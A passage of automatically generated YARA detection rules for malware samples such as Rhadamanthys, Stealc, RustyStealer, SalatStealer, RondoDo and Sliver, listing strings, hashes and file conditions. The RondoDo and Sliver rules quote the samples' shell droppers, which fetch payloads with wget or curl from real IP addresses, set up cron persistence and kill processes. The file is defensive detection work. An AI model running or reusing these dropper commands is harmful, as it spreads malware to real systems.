      $s1 = "DataSync.exe" fullword wide /* score: '22.00'*/
      $s2 = "PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "Developed by SyncSolutions Inc. Visit www.syncsolutions.com for more information." fullword wide /* score: '14.00'*/
      $s5 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s6 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0" fullword ascii /* score: '13.00'*/
      $s7 = "DataSync - Enterprise data synchronization tool" fullword wide /* score: '12.00'*/
      $s8 = "JMPlease, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s9 = "WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s10 = "@ - H*" fullword ascii /* score: '9.00'*/
      $s11 = "* wbCu" fullword ascii /* score: '9.00'*/
      $s12 = "h1/getwlstatus" fullword ascii /* score: '9.00'*/
      $s13 = "* :$eo" fullword ascii /* score: '9.00'*/
      $s14 = "/logstatus" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 13000KB and
      8 of them
}

rule Rhadamanthys_signature__979d4d3c19bd1d7e944b1ba868d6cce7_imphash__9f825074 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_979d4d3c19bd1d7e944b1ba868d6cce7(imphash)_9f825074.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9f8250744072a229d7ee9c8f30647d3865f1f3c235bb13e95b98ef228656ca87"
   strings:
      $s1 = "aurorarender.exe" fullword wide /* score: '22.00'*/
      $s2 = "PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s5 = "Aurora Render - Real-time Rendering Engine" fullword wide /* score: '12.00'*/
      $s6 = "WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s7 = "Please, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s8 = "*  &1&&" fullword ascii /* score: '9.00'*/
      $s9 = "*  &0&&" fullword ascii /* score: '9.00'*/
      $s10 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s11 = "3<$1<$3<$\\9" fullword ascii /* score: '9.00'*/ /* hex encoded string '19' */
      $s12 = "z/getwlstatus" fullword ascii /* score: '9.00'*/
      $s13 = "yPTJc+ I<" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      8 of them
}

rule ValleyRAT_signature__2 {
   meta:
      description = "_subset_batch - file ValleyRAT(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7f202b09b89850443780d48b17fd853d22695719d123c5b945363c02cce0b316"
   strings:
      $s1 = "vcruntime140_1.dll" fullword ascii /* score: '23.00'*/
      $s2 = "patrocinate.exe" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule Tsunami_signature_ {
   meta:
      description = "_subset_batch - file Tsunami(signature).elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1a930b4aa7c5f6e140466a8309037bf5def5614f7ed514bd9010868b8f51710b"
   strings:
      $s1 = "No child process" fullword ascii /* score: '15.00'*/
      $s2 = "__kernel_clock_gettime" fullword ascii /* score: '14.00'*/
      $s3 = "Remote I/O error" fullword ascii /* score: '10.00'*/
      $s4 = "No file descriptors available" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Rhadamanthys_signature__979d4d3c19bd1d7e944b1ba868d6cce7_imphash__ddc0d4c7 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_979d4d3c19bd1d7e944b1ba868d6cce7(imphash)_ddc0d4c7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ddc0d4c7f254a43d40195e8c787dbae1968d54bd6e26b21cb55375eb8aa219cc"
   strings:
      $s1 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s2 = "FPROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s4 = "WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s5 = "Please, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s6 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s7 = "/getwlstatus" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 15000KB and
      all of them
}

rule Stealc_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__f105ddfd {
   meta:
      description = "_subset_batch - file Stealc(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_f105ddfd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f105ddfdb845a2ce8cfd03bb6a00a8d2e5e59c6b0b1206c7efa547f740e90650"
   strings:
      $s1 = "Panda3D.exe" fullword wide /* score: '22.00'*/
      $s2 = "/dumpsta" fullword ascii /* score: '14.00'*/
      $s3 = "Panda3D - Open Source Game Engine" fullword wide /* score: '12.00'*/
      $s4 = "/getwltsvauu" fullword ascii /* score: '9.00'*/
      $s5 = "skipact" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      all of them
}

rule RondoDo_signature_ {
   meta:
      description = "_subset_batch - file RondoDo(signature).sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cd84c2b486ee129be3334bf006794e84f0b316f9bd96cd84c893b0c92be1f9b9"
   strings:
      $s1 = "for p in /proc/[0-9]*; do pid=${p##*/}; [ ! -e \"$p/exe\" ] && kill -9 \"$pid\" && continue; exelink=`ls -l \"$p/exe\" 2>/dev/nu" ascii /* score: '25.00'*/
      $s2 = "# wget http://74.194.191.52/rondo.lol;" fullword ascii /* score: '24.00'*/
      $s3 = "echo >/run/user/0/.t && cd /run/user/0 && rm -f arc arm arm4 arm5 arm6 arm7 arm8 aarch64 i486 i586 i686 x86 x86_64 x86_32 m68k m" ascii /* score: '24.00'*/
      $s4 = "# bang2012@protonmail.com" fullword ascii /* score: '22.00'*/
      $s5 = "(wget http://74.194.191.52/rondo.armv5l||curl -O http://74.194.191.52/rondo.armv5l||busybox wget http://74.194.191.52/rondo.armv" ascii /* score: '21.00'*/
      $s6 = "(wget http://74.194.191.52/rondo.i486||curl -O http://74.194.191.52/rondo.i486||busybox wget http://74.194.191.52/rondo.i486)" fullword ascii /* score: '21.00'*/
      $s7 = "(wget http://74.194.191.52/rondo.armv6l||curl -O http://74.194.191.52/rondo.armv6l||busybox wget http://74.194.191.52/rondo.armv" ascii /* score: '21.00'*/
      $s8 = "echo >/tmp/.t && cd /tmp && rm -f arc arm arm4 arm5 arm6 arm7 arm8 aarch64 i486 i586 i686 x86 x86_64 x86_32 m68k mips mipsel mps" ascii /* score: '21.00'*/
      $s9 = "(wget http://74.194.191.52/rondo.armv6l||curl -O http://74.194.191.52/rondo.armv6l||busybox wget http://74.194.191.52/rondo.armv" ascii /* score: '21.00'*/
      $s10 = "echo >/run/user/0/.t && cd /run/user/0 && rm -f arc arm arm4 arm5 arm6 arm7 arm8 aarch64 i486 i586 i686 x86 x86_64 x86_32 m68k m" ascii /* score: '21.00'*/
      $s11 = "(wget http://74.194.191.52/rondo.powerpc||curl -O http://74.194.191.52/rondo.powerpc||busybox wget http://74.194.191.52/rondo.po" ascii /* score: '21.00'*/
      $s12 = "(wget http://74.194.191.52/rondo.m68k||curl -O http://74.194.191.52/rondo.m68k||busybox wget http://74.194.191.52/rondo.m68k)" fullword ascii /* score: '21.00'*/
      $s13 = "(wget http://74.194.191.52/rondo.i586||curl -O http://74.194.191.52/rondo.i586||busybox wget http://74.194.191.52/rondo.i586)" fullword ascii /* score: '21.00'*/
      $s14 = "(wget http://74.194.191.52/rondo.powerpc-440fp||curl -O http://74.194.191.52/rondo.powerpc-440fp||busybox wget http://74.194.191" ascii /* score: '21.00'*/
      $s15 = "(wget http://74.194.191.52/rondo.arc700||curl -O http://74.194.191.52/rondo.arc700||busybox wget http://74.194.191.52/rondo.arc7" ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 40KB and
      8 of them
}

rule Sliver_signature_ {
   meta:
      description = "_subset_batch - file Sliver(signature).sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "48368be04445e66954f72073e04dae6f2b71f436c2b128e5158f53ccf6fa9935"
   strings:
      $s1 = "wget http://181.223.9.36:9000/script2 -O /etc/cron.hourly/script > /dev/null 2>&1" fullword ascii /* score: '27.00'*/
      $s2 = "wget -O /usr/bin/linux http://181.223.9.36:9000/linux > /dev/null 2>&1" fullword ascii /* score: '24.00'*/
      $s3 = "if [[ ! -f /etc/cron.hourly/script ]]; then " fullword ascii /* score: '18.00'*/
      $s4 = "if [[ ! -f /usr/bin/linux ]]; then" fullword ascii /* score: '15.00'*/
      $s5 = "[[ $var -eq 0 ]] && /usr/bin/linux > /dev/null 2>&1 &" fullword ascii /* score: '14.00'*/
      $s6 = "chmod +x /etc/cron.hourly/script" fullword ascii /* score: '14.00'*/
      $s7 = "chattr +i /etc/cron.hourly/script" fullword ascii /* score: '14.00'*/
      $s8 = "var=`ps -C linux | grep -v PID | wc -l`" fullword ascii /* score: '12.00'*/
      $s9 = "[[ $var -gt 1 ]] && killall linux > /dev/null 2>&1 " fullword ascii /* score: '11.00'*/
      $s10 = "chattr +i /usr/bin/linux" fullword ascii /* score: '11.00'*/
      $s11 = "chmod +x /usr/bin/linux" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      8 of them
}

rule RustyStealer_signature__3 {
   meta:
      description = "_subset_batch - file RustyStealer(signature).7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0821311306dfef23ae249451e7e0f6cc8a6fae9ff5e26f3e05d41ce141ff5754"
   strings:
      $s1 = "PkFj.Qjz" fullword ascii /* score: '10.00'*/
      $s2 = "* X9<z" fullword ascii /* score: '9.00'*/
      $s3 = "* f})8-y" fullword ascii /* score: '9.00'*/
      $s4 = ")@}^^/.4B^}&" fullword ascii /* score: '9.00'*/ /* hex encoded string 'K' */
      $s5 = "}7(B$\"\\" fullword ascii /* score: '9.00'*/ /* hex encoded string '{' */
      $s6 = "SPYM(//ihX" fullword ascii /* score: '9.00'*/
      $s7 = "CGkM(- " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 15000KB and
      all of them
}

rule RustyStealer_signature__4 {
   meta:
      description = "_subset_batch - file RustyStealer(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a0250f1492741b887218b1b38a09e77ae60764802ce092760e6647f43c1e4cd5"
   strings:
      $s1 = "*REF_IMGOOROOIRORO004940940PDF/mpclient.dll" fullword ascii /* score: '20.00'*/
      $s2 = "?REF_IMGOOROOIRORO004940940PDF/REF_IMGOOROOIRORO004940940PDF.exe" fullword ascii /* score: '19.00'*/
      $s3 = "* q1M:x" fullword ascii /* score: '9.00'*/
      $s4 = "nnjjjjj" fullword ascii /* score: '8.00'*/
      $s5 = "hpprjlxxi" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 9000KB and
      all of them
}

rule RustyStealer_signature__5 {
   meta:
      description = "_subset_batch - file RustyStealer(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f19e15a5cd7a1c8320e88636d921934a7cb9441186ff8c781a4f7df15a6b5764"
   strings:
      $s1 = "hello_vs.exeux" fullword ascii /* score: '13.00'*/
      $s2 = "PeakUnlimited (2).dllux" fullword ascii /* score: '13.00'*/
      $s3 = "* ``~T" fullword ascii /* score: '9.00'*/
      $s4 = "!]3\" !_5" fullword ascii /* score: '9.00'*/ /* hex encoded string '5' */
      $s5 = "#7#7#7 7 " fullword ascii /* score: '9.00'*/ /* hex encoded string 'ww' */
      $s6 = "zhZf!." fullword ascii /* score: '8.00'*/
      $s7 = "fgdgfgegg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 5000KB and
      all of them
}

rule RustyStealer_signature__48f38ed6 {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_48f38ed6.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "48f38ed611d1feab314c968554e15c88fa3058b96ef8e31375d028b71b814e6d"
   strings:
      $s1 = "BuQk.KQZ" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 1000KB and
      all of them
}

rule RustyStealer_signature__6e44aca1 {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_6e44aca1.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6e44aca19dcf26b0d462162eaceadf248d172e5551772f171b909da4c655bb01"
   strings:
      $s1 = "SWIFT_MT103_Euro_162,024.40 _ March - July 2025.js" fullword ascii /* score: '12.00'*/
      $s2 = "SWIFT_MT103_Euro_162,024.40 _ March - July 2025.jsuU[w" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 4KB and
      all of them
}

rule RustyStealer_signature__7688f594 {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_7688f594.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7688f594da22b8d7faefd60581e68ba20c6a493e9577796a00b1c5cdd87b395a"
   strings:
      $s1 = "Boleto  - Julho FINAL.htmlux" fullword ascii /* score: '12.00'*/
      $s2 = "Boleto - Agosto.htmlux" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 3KB and
      all of them
}

rule RustyStealer_signature__8b8fdda5 {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_8b8fdda5.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8b8fdda55045f71690e0479e65d81b8d5d26f0128085694a14b8d7f10f78af6f"
   strings:
      $s1 = "h|hxhthphlhhh" fullword ascii /* reversed goodware string 'hhhlhphthxh|h' */ /* score: '14.00'*/
      $s2 = ";s;c;S;C;3;#;" fullword ascii /* reversed goodware string ';#;3;C;S;c;s;' */ /* score: '11.00'*/
      $s3 = "?c?C?#?" fullword ascii /* reversed goodware string '?#?C?c?' */ /* score: '11.00'*/
      $s4 = "<s<S<3<" fullword ascii /* reversed goodware string '<3<S<s<' */ /* score: '11.00'*/
      $s5 = ":c:C:#:" fullword ascii /* reversed goodware string ':#:C:c:' */ /* score: '11.00'*/
      $s6 = "1t1T141" fullword ascii /* reversed goodware string '141T1t1' */ /* score: '11.00'*/
      $s7 = "-u-e-U-E-5-%-" fullword ascii /* reversed goodware string '-%-5-E-U-e-u-' */ /* score: '11.00'*/
      $s8 = "6t6d6T6D646$6" fullword ascii /* reversed goodware string '6$646D6T6d6t6' */ /* score: '11.00'*/
      $s9 = "7c7C7#7" fullword ascii /* reversed goodware string '7#7C7c7' */ /* score: '11.00'*/
      $s10 = "281490-REVISAODOCUMENTO_759434.hta" fullword ascii /* score: '11.00'*/
      $s11 = "2z2j2Z2J2:2*2" fullword ascii /* reversed goodware string '2*2:2J2Z2j2z2' */ /* score: '11.00'*/
      $s12 = "6d6T6D646$6" fullword ascii /* reversed goodware string '6$646D6T6d6' */ /* score: '11.00'*/
      $s13 = "4s4S434" fullword ascii /* reversed goodware string '434S4s4' */ /* score: '11.00'*/
      $s14 = "0s0S030" fullword ascii /* reversed goodware string '030S0s0' */ /* score: '11.00'*/
      $s15 = "4z4j4Z4J4:4*4" fullword ascii /* reversed goodware string '4*4:4J4Z4j4z4' */ /* score: '11.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 9000KB and
      8 of them
}

rule RustyStealer_signature__9abfeb5f {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_9abfeb5f.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9abfeb5feb753b7095901c28ae2baa998f9c53203c273b318af2ad0c18a1eb59"
   strings:
      $s1 = "QUO-LP-DG-PO-28647826758479382675892.vbs" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 1000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash_ {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c3666f3bae35133cc0bbef343da38624fe856de394419170115f130c2e9d66d6"
   strings:
      $s1 = "\\2\"a-]}" fullword ascii /* score: '10.00'*/ /* hex encoded string '*' */
      $s2 = "iTrAt$Z" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__24da360c {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_24da360c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "24da360ccd462b08dba0df2843a02df9d432c968c49d6812875bdbd9ccab1481"
   strings:
      $s1 = "7*$\"c\"@@" fullword ascii /* score: '9.00'*/ /* hex encoded string '|' */
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__25fb36a3 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_25fb36a3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "25fb36a3a527fc22d8ff61be2bbd49d90e4ff58f8e76f09480b99303a3b91fc9"
   strings:
      $s1 = "* .-`f1y" fullword ascii /* score: '9.00'*/
      $s2 = "* y7Wq Q" fullword ascii /* score: '9.00'*/
      $s3 = "- :2OdhP\"\\" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__2cfbf22d {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_2cfbf22d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2cfbf22df3ac89b22c948fd678f43c146f799fef0c268a9fd112bb46345e4dae"
   strings:
      $s1 = "aFtQJGwqQ" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s2 = "]>6;>5\"-" fullword ascii /* score: '9.00'*/ /* hex encoded string 'e' */
      $s3 = "* @??T" fullword ascii /* score: '9.00'*/
      $s4 = "%%S%Rwg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__53d84055 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_53d84055.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "53d84055d2e47345b78517110b02dc731a112e74cb48afd5689c03f0400e8551"
   strings:
      $s1 = ".KYL -`" fullword ascii /* score: '8.00'*/
      $s2 = "zcvcphm" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__586c640a {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_586c640a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "586c640a171ebeb480631dbcc01ec8effd8bb75721ff71e5d95e6170cf06a10b"
   strings:
      $s1 = "@\"\"5)^a." fullword ascii /* score: '9.00'*/ /* hex encoded string 'Z' */
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__5d72c26f {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_5d72c26f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5d72c26f7c2e808cca4b06ff8a0704afadc4d8a71bf9c99925c60f8ce36168a5"
   strings:
      $s1 = "Ax%Z% -" fullword ascii /* score: '9.00'*/
      $s2 = "{\"2+D,<$-" fullword ascii /* score: '9.00'*/ /* hex encoded string '-' */
      $s3 = "* +b-X5" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__644e5086 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_644e5086.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "644e50861ca06cd67b07d061b842cf0bcf793eb58d98134be6f86e78788e06de"
   strings:
      $s1 = "! 6-b}@=@" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__6a30c82a {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_6a30c82a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6a30c82ae2812001031443ef13300a7754153985880addebbab6aed0a5e798f9"
   strings:
      $s1 = "xWrG:\"" fullword ascii /* score: '10.00'*/
      $s2 = "* ;)u%j" fullword ascii /* score: '9.00'*/
      $s3 = "* {!TO" fullword ascii /* score: '9.00'*/
      $s4 = "fipkpvw" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__8a906749 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_8a906749.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8a906749df3a867cdc322263dfcd09a69d6a8a8f29ccef0f5f2af7bcba77a902"
   strings:
      $s1 = "* 9I}B" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__8f965b4e {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_8f965b4e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8f965b4e821c13d5010d94e38891264643712a6ea7718dbf9d163e062aa003eb"
   strings:
      $s1 = "* A>,>3" fullword ascii /* score: '9.00'*/
      $s2 = "dubdvym" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__a8f3aa2e {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_a8f3aa2e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a8f3aa2e776557fb62d33cd4c8a257f42b61af618bacc8b47fa8158ed636e491"
   strings:
      $s1 = "YlUM* xa" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__d83f553e {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_d83f553e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d83f553e5ad57d1a7bf12f393b64a49cb1984260d2ff9009c31867eb50e03204"
   strings:
      $s1 = "sNVD.hlG" fullword ascii /* score: '10.00'*/
      $s2 = "TBIRcZ*" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__e16d780c {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_e16d780c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e16d780c58a466e704bfcfa757957dfe25921a04b05d6a55fbef069427a50951"
   strings:
      $s1 = "0doWj0+ -" fullword ascii /* score: '12.00'*/
      $s2 = " CIjV+ )" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__a92e91e2 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_a92e91e2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a92e91e2664780be0ec791966c401b03cf08394ef1e7cde276c4085a6baef7ec"
   strings:
      $s1 = ",MyN7UTkl" fullword ascii /* base64 encoded string*/ /* score: '11.00'*/
      $s2 = "Li\"BPEYE.O?" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__e1301f46 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_e1301f46.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e1301f46c8fd7c6a0186df9b7973208b87541f2f47466ca9b51117d3e4ca9623"
   strings:
      $s1 = "agEtd #" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__ab976381 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_ab976381.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ab9763815f18d3a853c59c215cf0f0f05812df85166afb2a496aaa34e44a1e07"
   strings:
      $s1 = "$)|64(6)F" fullword ascii /* score: '9.00'*/ /* hex encoded string 'do' */
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__af7707d7 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_af7707d7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "af7707d77eee2b9a780e46c610476878e8f02ae2b16a599f081afb21d99d099b"
   strings:
      $s1 = "a*5zrGjn -" fullword ascii /* score: '8.00'*/
      $s2 = "NLNOx/;zQ* " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__b86b984a {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_b86b984a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b86b984addd013ed5d0cd5653529549b80a0dfae2552244d537b7030f915b475"
   strings:
      $s1 = "2D3B693A544F" ascii /* score: '17.00'*/ /* hex encoded string '-;i:TO' */
      $s2 = "06839AEC11F21BFFEAD8144952A8855F59DB77C59EB2405C78576677109A9581F2187D64BBC20EEC33C3F3A11223A6D290329BF3B802D1598D7145EDC43B8513" ascii /* score: '11.00'*/
      $s3 = "2D1CCB4C2CEBEE5D86D6003DA562F9EB593B7D37027DFB11EC13194DA0169C9265706FEBAF1103E62746B8BA3F62CDCE677F89FDB27FCB65126A27DAAA6F741E" ascii /* score: '11.00'*/
      $s4 = "FC3AC74C535A97D4728A39514B4D0F02C8E0F33AE5C87DFBBC599CB3FB3F480A82C66150C2841693D47FD61767CCE338925A7FEB7B35F9A813368F8FC7309B10" ascii /* score: '11.00'*/
      $s5 = "9E10BB599E1D6E498857C9831AD5C5A63FAA63DED2FF7D93B3D25FE2CDA75A1F076280D6251607EA0177EAC48E62651DE99F45DF1BBBEDCF7A7328FB223D809E" ascii /* score: '11.00'*/
      $s6 = "79581D5806F88872786D58C0F255E83D0E9860C9DD85F49794E7B8D07FB679BC1E21190F38C683EEFAF34C0E2EB86E5FC2C17569ED078B88F6C853EF41C62B5D" ascii /* score: '11.00'*/
